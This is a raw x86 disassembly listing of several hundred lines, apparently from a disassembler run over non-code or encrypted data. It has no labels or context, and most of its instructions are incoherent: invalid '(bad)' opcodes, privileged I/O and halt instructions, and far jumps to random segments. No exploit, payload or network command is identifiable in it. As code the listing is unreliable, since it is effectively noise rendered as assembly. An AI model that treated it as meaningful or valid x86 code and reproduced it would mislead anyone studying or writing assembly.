  420af7:	call   0x77d2:0x388c7757
  420afe:	dec    ecx
  420aff:	ret    
  420b00:	js     0x420b76
  420b02:	imul   esi,DWORD PTR [ebx],0xffffff97
  420b05:	xor    esi,ecx
  420b07:	pop    eax
  420b08:	inc    eax
  420b09:	repz jmp 0xd8ac432f
  420b0f:	pop    ss
  420b10:	adc    al,0x52
  420b12:	imul   eax,DWORD PTR [eax+0x26],0x90952b3e
  420b19:	ins    DWORD PTR es:[edi],dx
  420b1a:	push   edx
  420b1b:	inc    esp
  420b1c:	jle    0x420b4b
  420b1e:	shl    DWORD PTR [ebx+0x51f713],1
  420b24:	fld    TBYTE PTR [edx]
  420b26:	jae    0x420ad6
  420b28:	and    BYTE PTR [ebp+0x1],bh
  420b2b:	sub    DWORD PTR ds:0xa5e170c7,eax
  420b31:	mov    bh,0x14
  420b33:	mov    edx,0x66f38dab
  420b38:	jnp    0x420ada
  420b3a:	scas   al,BYTE PTR es:[edi]
  420b3b:	ret    
  420b3c:	das    
  420b3d:	xchg   bl,dh
  420b3f:	popf   
  420b40:	int3   
  420b41:	adc    BYTE PTR [edi-0x67069991],dl
  420b47:	repnz hlt 
  420b49:	popf   
  420b4a:	popf   
  420b4b:	(bad)  [ebp-0x3375c59b]
  420b51:	lds    ebx,FWORD PTR [esi-0x3c8e506c]
  420b57:	stc    
  420b58:	jmp    0x72e3b35d
  420b5d:	cmp    ah,BYTE PTR [ecx+0x61e66e70]
  420b63:	outs   dx,DWORD PTR ds:[esi]
  420b64:	mov    ?,WORD PTR [ebx]
  420b66:	hlt    
  420b67:	and    ebp,edi
  420b69:	cs push 0x7f0bd9c6
  420b6f:	mov    ah,0x3b
  420b71:	adc    DWORD PTR [ecx-0x7666f4af],0xffffff99
  420b78:	seto   BYTE PTR [edx+0x59]
  420b7c:	hlt    
  420b7d:	test   al,0x8e
  420b7f:	adc    al,0xb5
  420b81:	jo     0x420b20
  420b83:	xchg   esi,eax
  420b84:	inc    ebx
  420b85:	push   ds
  420b86:	push   edi
  420b87:	sub    dl,ah
  420b89:	mov    al,0xb4
  420b8b:	mov    eax,0x7c618131
  420b90:	jmp    0x1026:0x982d22f9
  420b97:	mov    ecx,0xb8cd68f2
  420b9c:	push   ecx
  420b9d:	jbe    0x420b3e
  420b9f:	(bad)
  420ba2:	jno    0x420b7a
  420ba4:	neg    DWORD PTR [ebx]
  420ba6:	mov    dl,0xb6
  420ba8:	pop    esp
  420ba9:	pop    ds
  420baa:	rcr    al,0xf9
  420bad:	clc    
  420bae:	enter  0x4864,0x2d
  420bb2:	sub    BYTE PTR es:[edi],0x68
  420bb6:	pop    ebx
  420bb7:	cli    
  420bb8:	push   es
  420bb9:	in     al,dx
  420bba:	mov    al,BYTE PTR [edi+0x49]
  420bbd:	shr    bl,1
  420bbf:	or     eax,0x2f71538a
  420bc4:	sub    eax,0x67e350c
  420bc9:	shr    BYTE PTR [eax+0x4f],0xb3
  420bcd:	jnp    0x420c00
  420bcf:	dec    esp
  420bd0:	retf   
  420bd1:	xlat   BYTE PTR ds:[ebx]
  420bd2:	add    esi,ebx
  420bd4:	jnp    0x420b9c
  420bd6:	adc    eax,0xa51138ff
  420bdb:	std    
  420bdc:	add    ch,BYTE PTR [ecx-0x77]
  420bdf:	add    edx,DWORD PTR [eax]
  420be1:	inc    eax
  420be2:	aaa    
  420be3:	ins    DWORD PTR es:[edi],dx
  420be4:	or     ebx,0xffffff8a
  420be7:	cmp    al,0x82
  420be9:	icebp  
  420bea:	sub    ah,BYTE PTR [ecx]
  420bec:	retf   0xd9ce
  420bef:	pop    eax
  420bf0:	daa    
  420bf1:	out    dx,eax
  420bf2:	pop    es
  420bf3:	inc    esi
  420bf4:	or     bl,BYTE PTR [ebp-0xd]
  420bf7:	cmp    bl,BYTE PTR [ebp+0x54]
  420bfa:	or     DWORD PTR [ecx+edx*8-0x5f86f62c],ebp
  420c01:	dec    ecx
  420c02:	mov    ds:0x2787082e,al
  420c07:	cdq    
  420c08:	aaa    
  420c09:	pushf  
  420c0a:	outs   dx,BYTE PTR ds:[esi]
  420c0b:	call   0xfe62:0x7b0c65fa
  420c12:	dec    eax
  420c13:	jmp    0x420c60
  420c15:	clc    
  420c16:	mov    fs,WORD PTR es:[eax-0x25]
  420c1a:	data16 clc 
  420c1c:	xlat   BYTE PTR ds:[ebx]
  420c1d:	xor    al,0xf2
  420c1f:	cs in  al,0x5d
  420c22:	aas    
  420c23:	std    
  420c24:	(bad)  
  420c25:	fnstenv [ecx+edx*8-0x4c774b50]
  420c2c:	jo     0x420c87
  420c2e:	and    BYTE PTR [ecx-0x48],0x68
  420c32:	mov    esi,0x95711c81
  420c37:	sbb    DWORD PTR [esi+0x1073a0ae],ecx
  420c3d:	sbb    al,0x5
  420c3f:	cmp    cl,ah
  420c41:	mov    cl,0xed
  420c43:	mov    cl,0xf6
  420c45:	sbb    eax,0xc93d2fae
  420c4a:	(bad)  
  420c4b:	cld    
  420c4c:	cmp    DWORD PTR [bx+di-0x65],ebp
  420c50:	mov    bl,0x1
  420c52:	jl     0x420c92
  420c54:	ss xchg ebx,eax
  420c56:	(bad)  
  420c57:	push   esp
  420c58:	mov    cl,0x0
  420c5a:	in     eax,dx
  420c5b:	in     al,dx
  420c5c:	inc    esp
  420c5d:	push   edx
  420c5e:	stc    
  420c5f:	jae    0x420c33
  420c61:	(bad)  
  420c62:	cld    
  420c63:	mov    bl,0x64
  420c65:	retf   
  420c66:	cmp    bl,BYTE PTR [edx+0x48]
  420c69:	mov    es,esi
  420c6b:	jne    0x420cd6
  420c6d:	mov    esp,0x53efa15a
  420c72:	dec    esi
  420c73:	inc    ebp
  420c74:	mov    dl,0x47
  420c76:	cmc    
  420c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c78:	dec    ebx
  420c79:	imul   esi,DWORD PTR [eax+0x7b],0xe2a83ab
  420c80:	inc    esi
  420c81:	(bad)  
  420c82:	mov    ebp,0xe200e513
  420c87:	repnz dec esp
  420c89:	or     BYTE PTR [esi-0x25],dh
  420c8c:	add    bh,cl
  420c8e:	mov    edi,0x7c2a70c2
  420c93:	stos   BYTE PTR es:[edi],al
  420c94:	imul   eax,DWORD PTR [esi-0x5f],0xffffffd7
  420c98:	lds    ecx,FWORD PTR [eax]
  420c9a:	mov    al,0x2c
  420c9c:	sub    eax,0x8510b2f1
  420ca1:	shl    DWORD PTR [edx],cl
  420ca3:	daa    
  420ca4:	cs pop ecx
  420ca6:	cmp    esi,ecx
  420ca8:	sar    DWORD PTR [edx+0x1e],0x7e
  420cac:	sub    esp,DWORD PTR [edx]
  420cae:	mov    ebp,0x640d4fc4
  420cb3:	mov    ebx,0x660c1323
  420cb8:	or     BYTE PTR [ebx+edi*8],dl
  420cbb:	aas    
  420cbc:	push   edi
  420cbd:	pop    esi
  420cbe:	scas   eax,DWORD PTR es:[edi]
  420cbf:	aaa    
  420cc0:	pushw  0xf472
  420cc4:	test   eax,0xbb6e8636
  420cc9:	lds    ebp,FWORD PTR ds:0x39fa442f
  420ccf:	pop    esp
  420cd0:	push   ecx
  420cd1:	shr    DWORD PTR [ecx-0x4f],cl
  420cd4:	xchg   esi,eax
  420cd5:	test   al,0x6e
  420cd7:	lods   al,BYTE PTR ds:[esi]
  420cd8:	add    BYTE PTR [eax-0x35],al
  420cdb:	mov    edx,0x29b66007
  420ce0:	ins    BYTE PTR es:[edi],dx
  420ce1:	bound  edi,QWORD PTR [edi-0x67]
  420ce4:	or     eax,0xb95c6e07
  420ce9:	ins    DWORD PTR es:[edi],dx
  420cea:	ins    BYTE PTR es:[edi],dx
  420ceb:	push   esp
  420cec:	std    
  420ced:	loope  0x420ce5
  420cef:	push   ss
  420cf0:	cmp    al,0xe8
  420cf2:	pop    edi
  420cf3:	sub    eax,DWORD PTR [ebp+0x2c]
  420cf6:	(bad)  
  420cf7:	les    esi,FWORD PTR [esi]
  420cf9:	sub    eax,DWORD PTR [ebp-0x2d]
  420cfc:	mov    bh,0xdd
  420cfe:	adc    eax,0xbdc7bc87
  420d03:	enter  0xfae,0x61
  420d07:	dec    ebx
  420d08:	push   ecx
  420d09:	aad    0xe5
  420d0b:	pop    edx
  420d0c:	mov    ds:0x955430f0,al
  420d11:	call   0xe86ec510
  420d16:	sbb    DWORD PTR [ecx+0x44d5e804],edi
  420d1c:	jno    0x420c9e
  420d1e:	call   0x41616768
  420d23:	or     eax,0xc605eca3
  420d28:	lahf   
  420d29:	or     BYTE PTR [edx+0x4c],al
  420d2c:	mov    ah,0x62
  420d2e:	jns    0x420cbb
  420d30:	push   ebp
  420d31:	mov    eax,0x2349e9
  420d36:	add    BYTE PTR ds:0xe7c03733,ch
  420d3c:	fsub   QWORD PTR [ebp-0x7d]
  420d3f:	(bad)  [esi-0x53]
  420d42:	jle    0x420d99
  420d44:	jo     0x420d02
  420d46:	lock ret 0x61b7
  420d4a:	bound  edx,QWORD PTR [ecx+0x5f]
  420d4d:	bound  esp,QWORD PTR [edx+0x19]
  420d50:	bound  esi,QWORD PTR [ebx+0x36]
  420d53:	xor    al,0x10
  420d55:	sar    ebx,cl
  420d57:	xchg   BYTE PTR [esi+eax*2+0x47123501],cl
  420d5e:	call   0x2426:0xa6e9d180
  420d65:	xchg   edx,eax
  420d66:	dec    esi
  420d67:	xchg   edx,eax
  420d68:	loopne 0x420d87
  420d6a:	or     ebp,edi
  420d6c:	mov    edi,0x9524e12
  420d71:	mov    ecx,DWORD PTR [esi]
  420d73:	sbb    ch,BYTE PTR [edx+edx*8-0x6]
  420d77:	ds stos DWORD PTR es:[edi],eax
  420d79:	out    0x62,eax
  420d7b:	in     eax,dx
  420d7c:	pop    ecx
  420d7d:	inc    edi
  420d7e:	lods   al,BYTE PTR ds:[esi]
  420d7f:	or     BYTE PTR [ecx],dl
  420d81:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  420d83:	xchg   esp,eax
  420d84:	shl    BYTE PTR [ebx+0x184b317d],1
  420d8a:	ins    BYTE PTR es:[edi],dx
  420d8b:	mov    bl,0x82
  420d8d:	mov    dh,0xfd
  420d8f:	out    0x42,eax
  420d91:	jbe    0x420daf
  420d93:	pop    ebx
  420d94:	int3   
  420d95:	aam    0x32
  420d97:	call   0x26bd52a8
  420d9c:	add    al,BYTE PTR [eax]
  420d9e:	jecxz  0x420d4d
  420da0:	js     0x420d8f
  420da2:	or     BYTE PTR [edi],ah
  420da4:	add    esp,edi
  420da6:	dec    esi
  420da7:	mov    dl,0x6d
  420da9:	adc    cl,BYTE PTR [edx+edi*2]
  420dac:	(bad)  
  420dad:	xlat   BYTE PTR ds:[ebx]
  420dae:	nop
  420daf:	sub    esi,ebp
  420db1:	lods   al,BYTE PTR ds:[esi]
  420db2:	jmp    0x22b9:0x9aa03321
  420db9:	loope  0x420e07
  420dbb:	mov    dh,0xe7
  420dbd:	mov    ah,BYTE PTR ds:0x86065336
  420dc3:	pop    edx
  420dc4:	push   ds
  420dc5:	repnz lock clc 
  420dc8:	xchg   edi,eax
  420dc9:	repnz fild WORD PTR [ebx-0x2f79b5c0]
  420dd0:	dec    esi
  420dd1:	mov    ds:0x31b49da,eax
  420dd6:	into   
  420dd7:	cmp    di,WORD PTR [ecx+0xdf40a60]
  420dde:	adc    cl,dl
  420de0:	nop
  420de1:	cs js  0x420e5a
  420de4:	aaa    
  420de5:	in     eax,0x59
  420de7:	cdq    
  420de8:	pop    esp
  420de9:	push   ss
  420dea:	mov    ds:0x7d840941,eax
  420def:	das    
  420df0:	and    al,dh
  420df2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420df3:	stos   BYTE PTR es:[edi],al
  420df4:	out    dx,al
  420df5:	cmc    
  420df6:	mov    esi,0x629a7d69
  420dfb:	mov    ebx,0x894506f6
  420e00:	add    eax,0x2c5c771b
  420e05:	sub    DWORD PTR [edx-0x3e],esi
  420e08:	js     0x420de6
  420e0a:	pop    edx
  420e0b:	imul   eax,DWORD PTR [ecx],0xffffffdd
  420e0e:	jp     0x420e8c
  420e10:	xor    DWORD PTR [ebx+0x7c3a7083],esi
  420e16:	mov    bh,0x34
  420e18:	jl     0x420e18
  420e1a:	adc    ah,cl
  420e1c:	pop    ebp
  420e1d:	fwait
  420e1e:	ret    0x575f
  420e21:	xchg   ebp,eax
  420e22:	adc    esi,DWORD PTR [edi+0x72]
  420e25:	ins    BYTE PTR es:[edi],dx
  420e26:	(bad)  
  420e27:	fdivr  st(1),st
  420e29:	jecxz  0x420e46
  420e2b:	out    0xd5,eax
  420e2d:	adc    DWORD PTR [ecx],0x34
  420e30:	test   DWORD PTR [ebx+eiz*4-0x58],edi
  420e34:	sbb    edi,ebp
  420e36:	or     eax,0xe92f1708
  420e3b:	repz loope 0x420e5e
  420e3e:	or     DWORD PTR [esi+0xf],0xffffffc4
  420e42:	add    cl,cl
  420e44:	dec    ecx
  420e45:	sub    dl,BYTE PTR [edx-0x46e4dc7f]
  420e4b:	xor    al,BYTE PTR [esi+0x3283f35a]
  420e51:	xor    bh,ah
  420e53:	push   es
  420e54:	sub    esp,edx
  420e56:	push   esp
  420e57:	mov    ch,0xb9
  420e59:	jp     0x420e6c
  420e5b:	jecxz  0x420df7
  420e5d:	mov    ebp,0xe68dff59
  420e62:	mov    al,ds:0xfd7192
  420e67:	icebp  
  420e68:	stos   BYTE PTR es:[edi],al
  420e69:	js     0x420e31
  420e6b:	adc    al,0x91
  420e6d:	(bad)  
  420e6f:	arpl   si,dx
  420e71:	jg     0x420e39
  420e73:	gs aas 
  420e75:	mov    ds:0x781e16e9,al
  420e7a:	xor    dl,BYTE PTR [ebx-0x38]
  420e7d:	jmp    0x7414141b
  420e82:	cdq    
  420e83:	sub    al,0x85
  420e85:	stc    
  420e86:	shl    BYTE PTR [edi-0x4f527ec9],0x5e
  420e8d:	adc    BYTE PTR [esi+0x72],bl
  420e90:	push   eax
  420e91:	inc    ebp
  420e92:	rol    DWORD PTR ds:0xa7a2e491,1
  420e98:	jp     0x420ed6
  420e9a:	sub    ecx,DWORD PTR [ebp+0x1e778bd8]
  420ea0:	mov    ebx,0xdd535507
  420ea5:	std    
  420ea6:	xchg   ebx,eax
  420ea7:	inc    ebx
  420ea8:	mov    edx,DWORD PTR [eax-0x16]
  420eab:	clc    
  420eac:	xchg   DWORD PTR [esi-0x3a21f920],esi
  420eb2:	stos   DWORD PTR es:[edi],eax
  420eb3:	lock xor edi,DWORD PTR [edx-0x76]
  420eb7:	cmp    DWORD PTR [esi-0x39],0x280bedbb
  420ebe:	dec    eax
  420ebf:	jecxz  0x420e86
  420ec1:	lahf   
  420ec2:	aaa    
  420ec3:	(bad)  
  420ec4:	icebp  
  420ec5:	in     eax,dx
  420ec6:	je     0x420eab
  420ec8:	sub    BYTE PTR [edi-0x27706f18],bl
  420ece:	scas   eax,DWORD PTR es:[edi]
  420ecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ed0:	retf   
  420ed1:	popf   
  420ed2:	adc    al,0xbd
  420ed4:	mov    ecx,DWORD PTR [ebx+edi*1-0x4]
  420ed8:	jmp    0xc3c78827
  420edd:	lea    esp,[eax-0x2e]
  420ee0:	lea    edx,[esi+esi*8+0x20]
  420ee4:	sbb    esp,edi
  420ee6:	fisub  DWORD PTR [ecx]
  420ee8:	jns    0x420f57
  420eea:	xor    al,0x39
  420eec:	mov    DWORD PTR [ecx-0x71a52358],ebx
  420ef2:	dec    ebx
  420ef3:	ret    
  420ef4:	push   ss
  420ef5:	dec    ecx
  420ef6:	xor    al,0x4
  420ef8:	stos   BYTE PTR es:[edi],al
  420ef9:	push   ss
  420efa:	mov    bl,0x48
  420efc:	mov    dl,0x35
  420efe:	arpl   WORD PTR [ebp+0x72],sp
  420f01:	mov    cl,0x4c
  420f04:	aaa    
  420f05:	fdivr  DWORD PTR [eax+0x27]
  420f08:	inc    edi
  420f09:	and    DWORD PTR [edx+0x2374b52d],0xce99ee72
  420f13:	adc    DWORD PTR [eax+0x35],0x3620896d
  420f1a:	xchg   esp,eax
  420f1b:	mov    esp,0x57c1035e
  420f20:	xchg   ebx,eax
  420f21:	or     eax,0xc3462ef5
  420f26:	sbb    ebx,DWORD PTR [esi-0x17]
  420f29:	adc    eax,0xc7b0f054
  420f2e:	jo     0x420f57
  420f30:	sbb    eax,DWORD PTR [esi+0x539b8466]
  420f36:	xlat   BYTE PTR ds:[ebx]
  420f37:	imul   edx,DWORD PTR [ebx],0x9db4b011
  420f3d:	scas   eax,DWORD PTR es:[edi]
  420f3e:	sahf   
  420f3f:	push   ss
  420f40:	call   0xa881a32f
  420f45:	or     BYTE PTR [ebp-0x70],cl
  420f48:	gs dec esi
  420f4a:	push   edi
  420f4b:	mov    cl,0x9a
  420f4d:	push   es
  420f4e:	outs   dx,BYTE PTR ds:[esi]
  420f4f:	lds    esp,FWORD PTR [ebx]
  420f51:	add    ch,bh
  420f53:	and    DWORD PTR [edi],0x707fb361
  420f59:	std    
  420f5a:	xchg   ecx,eax
  420f5b:	je     0x420f16
  420f5d:	sti    
  420f5e:	push   ss
  420f5f:	mul    ch
  420f61:	inc    ecx
  420f62:	hlt    
  420f63:	inc    esp
  420f64:	pop    ebx
  420f65:	cwde   
  420f66:	out    0xc3,al
  420f68:	xor    eax,0xcf57ffae
  420f6d:	xchg   ebx,eax
  420f6e:	xchg   edi,eax
  420f6f:	aaa    
  420f70:	(bad)  
  420f71:	push   eax
  420f72:	in     al,dx
  420f73:	out    dx,eax
  420f74:	out    dx,eax
  420f75:	hlt    
  420f76:	or     al,0x64
  420f78:	lea    ebx,[edi]
  420f7a:	inc    ecx
  420f7b:	into   
  420f7c:	arpl   WORD PTR [ecx],dx
  420f7e:	sbb    eax,0x61b88e65
  420f83:	outs   dx,DWORD PTR ds:[esi]
  420f84:	mov    ebx,0x3be6e887
  420f89:	xor    eax,0xda3a3bbc
  420f8e:	es xchg esp,eax
  420f90:	iret   
  420f91:	clc    
  420f92:	jbe    0x420faf
  420f94:	push   0xb7012258
  420f99:	push   ebx
  420f9a:	pop    ecx
  420f9b:	mov    ebx,0x3d470926
  420fa0:	pop    edx
  420fa1:	stos   BYTE PTR es:[edi],al
  420fa2:	inc    ebp
  420fa3:	inc    esp
  420fa4:	xchg   esi,eax
  420fa5:	fucomi st,st(2)
  420fa7:	shl    BYTE PTR [ebp-0x6bdacbd9],1
  420fad:	js     0x420f85
  420faf:	retf   
  420fb0:	stos   BYTE PTR es:[edi],al
  420fb1:	adc    eax,0x6be50894
  420fb6:	outs   dx,BYTE PTR ds:[esi]
  420fb7:	mov    esp,0x49b4bfd6
  420fbc:	imul   ebp,eax,0x4e
  420fbf:	jp     0x420fed
  420fc1:	test   DWORD PTR [eax],edi
  420fc3:	ret    
  420fc4:	out    0x8b,eax
  420fc6:	rol    DWORD PTR [edx],cl
  420fc8:	fadd   DWORD PTR [eax+0x4a]
  420fcb:	jnp    0x420f7f
  420fcd:	leave  
  420fce:	cmc    
  420fcf:	or     DWORD PTR [ebp+0x6a65b4bf],ebx
  420fd5:	inc    eax
  420fd6:	in     eax,0x4b
  420fd8:	jp     0x42101b
  420fda:	mov    DWORD PTR [ebx+0x1d],esi
  420fdd:	mov    esp,ds
  420fdf:	fwait
  420fe0:	hlt    
  420fe1:	pusha  
  420fe2:	jg     0x421042
  420fe4:	test   eax,0x7e5a91ec
  420fe9:	xlat   BYTE PTR ds:[ebx]
  420fea:	push   ebp
  420feb:	jae    0x42103a
  420fed:	mov    DWORD PTR [ecx+ebp*8],esp
  420ff0:	cld    
  420ff1:	sbb    DWORD PTR [ecx+0x5ef1bf9e],ebx
  420ff7:	push   ss
  420ff8:	aas    
  420ff9:	xchg   ebx,eax
  420ffa:	in     eax,0x62
  420ffc:	push   ds
  420ffd:	mov    DWORD PTR [ecx+ecx*1+0x4995149e],ebx
  421004:	sbb    DWORD PTR [ebx+0x65],0xfa0188a1
  42100b:	xor    BYTE PTR [eax-0x7e5ad151],bh
  421011:	xor    eax,0xb72e5575
  421016:	mov    ebx,DWORD PTR [eax-0x51]
  421019:	ror    esi,0x50
  42101c:	sbb    DWORD PTR [edx-0x1b],0x3b
  421020:	repnz pop esi
  421022:	add    edx,edx
  421024:	cwde   
  421025:	xchg   edx,eax
  421026:	cvttps2pi mm1,QWORD PTR [edx+0xc382b79]
  42102d:	dec    BYTE PTR [edi-0x31]
  421030:	in     al,0xa3
  421032:	sar    BYTE PTR [edx-0x1797d52d],1
  421038:	add    BYTE PTR [edi+ebp*4],ah
  42103b:	mov    esp,0x3ded27bc
  421040:	call   0x113:0x384b431
  421047:	and    ah,0xcb
  42104a:	adc    ebp,edx
  42104c:	sub    ebp,DWORD PTR [esi-0x3]
  42104f:	outs   dx,BYTE PTR ds:[esi]
  421050:	push   edi
  421051:	stc    
  421052:	mov    eax,DWORD PTR [ebp+0x8]
  421055:	inc    esi
  421056:	test   BYTE PTR [edi+0x12bf9454],ah
  42105c:	js     0x420fde
  42105e:	(bad)  
  42105f:	hlt    
  421060:	dec    edi
  421061:	out    0x74,eax
  421063:	xlat   BYTE PTR ds:[ebx]
  421064:	mov    cl,0x9f
  421066:	jns    0x420ff3
  421068:	aas    
  421069:	stc    
  42106a:	ja     0x42103f
  42106c:	scas   eax,DWORD PTR es:[edi]
  42106d:	push   cs
  42106e:	inc    ecx
  42106f:	pop    edi
  421070:	cmp    eax,eax
  421072:	pop    esp
  421073:	xchg   edx,eax
  421074:	test   DWORD PTR [esi+0x2a],eax
  421077:	in     eax,0x90
  421079:	mov    edi,0x74c1bbe0
  42107e:	sbb    ecx,esi
  421080:	int    0x3f
  421082:	ss or  bl,bh
  421085:	inc    esi
  421086:	iret   
  421087:	xor    al,BYTE PTR fs:0xd0a05776
  42108e:	pop    edi
  42108f:	pop    esi
  421090:	adc    BYTE PTR ds:0xde2c5144,bh
  421096:	stc    
  421097:	sbb    eax,0xcc1f023d
  42109c:	add    al,0xa5
  42109e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42109f:	push   0x2cf259d8
  4210a4:	scas   eax,DWORD PTR es:[edi]
  4210a5:	adc    bl,BYTE PTR [edi]
  4210a7:	and    edi,DWORD PTR [ebp-0x7e]
  4210aa:	sub    eax,0xd6a53dda
  4210af:	and    BYTE PTR [ecx-0xfead74c],cl
  4210b5:	sub    al,0x4a
  4210b7:	cmp    eax,0x25a161d2
  4210bc:	xor    BYTE PTR [eax+0x102815c],0x66
  4210c3:	ss ins BYTE PTR es:[edi],dx
  4210c5:	in     eax,dx
  4210c6:	outs   dx,DWORD PTR es:[esi]
  4210c8:	sbb    al,0x2f
  4210ca:	(bad)  
  4210cc:	pop    ss
  4210cd:	and    DWORD PTR [eax-0x24],0x49
  4210d1:	shr    al,cl
  4210d3:	push   edx
  4210d4:	(bad)  
  4210d5:	mov    ch,BYTE PTR ds:0xb6b5ed9b
  4210db:	inc    ebp
  4210dc:	fisttp DWORD PTR [esi]
  4210de:	pop    ebx
  4210df:	aam    0xd0
  4210e1:	jmp    0x6f89:0x895db5ab
  4210e8:	adc    eax,0x544d4e78
  4210ed:	jge    0x42107d
  4210ef:	jg     0x42114c
  4210f1:	pop    ebx
  4210f2:	pop    ecx
  4210f3:	stos   DWORD PTR es:[edi],eax
  4210f4:	push   ss
  4210f5:	jmp    0x4210b0
  4210f7:	mov    cl,0x0
  4210f9:	inc    ebp
  4210fa:	in     eax,0xd5
  4210fc:	inc    esp
  4210fd:	pop    esi
  4210fe:	push   ds
  4210ff:	pushf  
  421100:	into   
  421101:	mov    bl,0x99
  421103:	mov    esp,0xd901e278
  421108:	repnz push ss
  42110a:	in     al,dx
  42110b:	cli    
  42110c:	xor    eax,0xb16fe228
  421111:	out    dx,eax
  421112:	aaa    
  421113:	rcl    DWORD PTR [edx-0x44b266a5],0x58
  42111a:	jge    0x4210c5
  42111c:	lock jne 0x4210ca
  42111f:	call   0x3b068328
  421124:	mov    al,ds:0xfbc52222
  421129:	mov    edi,0xa4fa2c69
  42112e:	sbb    ebp,ecx
  421130:	outs   dx,DWORD PTR ds:[esi]
  421131:	adc    eax,0xa94e8fb4
  421136:	cwde   
  421137:	lahf   
  421138:	xchg   DWORD PTR [ecx-0x1d],ecx
  42113b:	inc    edi
  42113c:	inc    edi
  42113d:	xchg   ebx,eax
  42113e:	add    eax,0xbf76d292
  421143:	retf   0x82b5
  421146:	ret    
  421147:	into   
  421148:	hlt    
  421149:	jbe    0x4210ff
  42114b:	dec    edx
  42114c:	fidivr DWORD PTR [edi+0x7a647783]
  421152:	clc    
  421153:	xor    bh,dh
  421155:	into   
  421156:	cmp    cl,cl
  421158:	pop    ds
  421159:	int3   
  42115a:	jp     0x4211c6
  42115c:	sti    
  42115d:	dec    esi
  42115e:	adc    cl,BYTE PTR [edx]
  421160:	in     eax,dx
  421161:	mov    edx,0xedea9ea8
  421166:	inc    esi
  421167:	std    
  421168:	pmovmskb edx,mm7
  42116b:	cdq    
  42116c:	dec    ebp
  42116d:	dec    ebp
  42116e:	push   ss
  42116f:	loope  0x4211d8
  421171:	push   ecx
  421172:	add    DWORD PTR ss:[esi+eiz*1-0x6a],eax
  421177:	add    DWORD PTR [edi+edi*8-0x5e92cd33],ebx
  42117e:	cmp    edx,DWORD PTR [ecx*4-0x4a845e8a]
  421185:	(bad)  
  421186:	dec    edx
  421187:	lahf   
  421188:	jge    0x421192
  42118a:	sbb    DWORD PTR [edx-0x1be7c916],ebp
  421190:	pop    ss
  421191:	push   ebp
  421192:	loope  0x421170
  421194:	or     BYTE PTR [edi+0xd],al
  421197:	and    ebp,esp
  421199:	sbb    al,BYTE PTR [ebp-0x4f69b0a4]
  42119f:	fs in  al,0x35
  4211a2:	shr    BYTE PTR [eax],1
  4211a4:	loop   0x421218
  4211a6:	jmp    0xa455803d
  4211ab:	push   ecx
  4211ac:	ret    
  4211ad:	cs in  eax,dx
  4211af:	jns    0x4211a4
  4211b1:	addr16 cdq 
  4211b3:	enter  0xbb5a,0x6b
  4211b7:	xor    eax,0x72397683
  4211bc:	mov    al,0x90
  4211be:	sub    BYTE PTR [ecx],bh
  4211c0:	inc    esp
  4211c1:	lea    edi,[ecx+0x18]
  4211c4:	loope  0x4211bb
  4211c6:	mov    WORD PTR [ebp+0x4c],ds
  4211c9:	xchg   BYTE PTR [eax],ah
  4211cb:	jge    0x4211ce
  4211cd:	ja     0x4211c5
  4211cf:	and    DWORD PTR [esp+ebx*1],esp
  4211d2:	mov    esp,0x837ab503
  4211d7:	xchg   ecx,eax
  4211d8:	dec    esp
  4211d9:	xchg   DWORD PTR [edi],eax
  4211db:	xor    BYTE PTR [edx],bl
  4211dd:	jno    0x42121b
  4211df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211e0:	rcr    BYTE PTR [ebp-0x128ad9d6],cl
  4211e6:	mov    edx,0x70f1b56b
  4211eb:	icebp  
  4211ec:	icebp  
  4211ed:	(bad)  
  4211ee:	mov    esi,0x30fe6351
  4211f3:	mov    ecx,DWORD PTR [eax+0x6b]
  4211f6:	push   ebp
  4211f7:	sbb    bl,cl
  4211f9:	imul   edx,DWORD PTR [esi-0x28f1d3],0xffffffb5
  421200:	out    dx,eax
  421201:	mov    al,ds:0x6e14691a
  421206:	and    DWORD PTR ds:0xeef08ec8,esi
  42120c:	ffreep st(7)
  42120e:	nop
  42120f:	dec    esp
  421210:	and    DWORD PTR [ecx+0x77f0fa98],ecx
  421216:	inc    edi
  421217:	loope  0x421296
  421219:	shl    eax,0x99
  42121c:	push   edx
  42121d:	pop    ecx
  42121e:	pop    esi
  42121f:	xchg   esp,eax
  421220:	es push 0xffffffda
  421223:	call   0x28b3:0x5e868deb
  42122a:	mov    esp,0x493b7ed3
  42122f:	cmp    eax,0xf7efe7ef
  421234:	sar    BYTE PTR [edi-0x15],1
  421237:	adc    DWORD PTR [eax],esp
  421239:	dec    ebp
  42123a:	stos   DWORD PTR es:[edi],eax
  42123b:	adc    al,0xf2
  42123d:	inc    esi
  42123e:	pop    edi
  42123f:	push   edi
  421240:	mov    dh,0x70
  421242:	cdq    
  421243:	jl     0x4211fb
  421245:	jbe    0x4211d0
  421247:	(bad)  
  421248:	aad    0x96
  42124a:	leave  
  42124b:	jo     0x4211db
  42124d:	sub    eax,0xd3a64e22
  421252:	mov    cl,0xe9
  421254:	sti    
  421255:	jle    0x4212d5
  421257:	jecxz  0x42120e
  421259:	out    0xdf,eax
  42125b:	in     eax,dx
  42125c:	cdq    
  42125d:	shr    DWORD PTR [ebx-0x259c697],cl
  421263:	jecxz  0x4212e1
  421265:	hlt    
  421266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421267:	jns    0x4212c7
  421269:	cmp    DWORD PTR ds:0xfe96d09e,ecx
  42126f:	xor    eax,DWORD PTR [ebx+eax*4]
  421272:	data16 aam 0xfe
  421275:	fsub   st(3),st
  421277:	into   
  421278:	lds    ecx,FWORD PTR [esi]
  42127a:	sub    cl,ch
  42127c:	or     al,0x1a
  42127e:	adc    DWORD PTR [ebp+0x1d2d6e9],ecx
  421284:	add    al,0xad
  421286:	or     eax,0xc916c22d
  42128b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42128c:	ss pop eax
  42128e:	xlat   BYTE PTR ds:[ebx]
  42128f:	psrlw  mm1,QWORD PTR [edi+edx*2-0x734c2ad8]
  421297:	pop    ds
  421298:	(bad)  
  421299:	(bad)  
  42129a:	adc    dl,BYTE PTR ds:0x2a425e0d
  4212a0:	jge    0x4212a4
  4212a2:	shl    BYTE PTR ds:0x6d7b032,cl
  4212a8:	adc    BYTE PTR [edi-0x527265d6],bl
  4212ae:	or     DWORD PTR ds:0x25a617a0,ebp
  4212b4:	push   esi
